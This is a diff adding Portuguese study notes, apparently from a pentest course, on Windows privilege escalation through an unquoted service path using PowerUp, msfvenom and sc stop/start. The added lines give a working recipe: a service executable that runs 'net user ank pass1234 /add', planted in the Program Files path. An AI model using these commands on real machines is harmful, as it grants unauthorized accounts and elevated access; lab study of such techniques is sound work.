@@ -126,6 +126,28 @@ PowerUp
 
 > Get-ServiceUnquoted
 
+
+O nome do servico, tem que ser referente ao nome inicial do PATH UNQUOTED.
+exemplo: [ C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe ] nesse caso o nome que vamos usar em nosso service eh Common.exe
+
+Criamos entao nosso payload usando o msfvenon
+
+> msfvenom -p windows/exec CMD="net user ank pass1234 /add" -f exe-service -o common.exe
+
+Transferimos para nossa maquina alvo e adicionamos nosso payload no directorio.
+
+> C:\Program Files\Unquoted Path Service\Common Files\
+
+Agora, paramos o servico e damos start novamente.
+
+> sc stop unquotedsvc
+
+> sc start unquotedsvc
+
+POW!! temos nosso priv esc. no caso adicionamos o user (ank)no grupo de administrators.
+
+
+
 ----------------------------------------------------------------------------------------------------------------------------------------
 02 - https://www.youtube.com/watch?v=9s8jYwx9FSA&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=4&t=0s
 
